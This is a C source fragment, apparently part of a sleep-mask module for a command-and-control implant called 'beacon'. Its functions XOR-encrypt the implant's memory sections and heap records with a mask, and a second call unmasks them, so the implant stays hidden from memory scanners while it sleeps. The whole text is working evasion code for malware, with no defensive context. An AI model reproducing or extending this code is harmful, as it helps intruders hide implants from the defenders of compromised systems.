

/* Mask a beacon section
 *   First call will mask
 *   Second call will unmask
 */
void mask_section(SLEEPMASKP * parms, DWORD a, DWORD b) {
   while (a < b) {
      *(parms->beacon_ptr + a) ^= parms->mask[a % MASK_SIZE];
      a++;
   }
}

/* Mask the beacons sections
 *   First call will mask
 *   Second call will unmask
 */
void mask_sections(SLEEPMASKP * parms) {
   DWORD * index;
   DWORD a, b;

   /* walk our sections and mask them */
   index = parms->sections;
   while (TRUE) {
      a = *index; b = *(index + 1);
      index += 2;
      if (a == 0 && b == 0)
         break;

      mask_section(parms, a, b);
   }
}

/* Mask the heap memory allocated by beacon
 *   First call will mask
 *   Second call will unmask
 */
void mask_heap(SLEEPMASKP * parms) {
   DWORD a, b;

   /* mask the heap records */
   a = 0;
   while (parms->heap_records[a].ptr != NULL) {
      for (b = 0; b < parms->heap_records[a].size; b++) {
         parms->heap_records[a].ptr[b] ^= parms->mask[b % MASK_SIZE];
      }
      a++;
   }
}
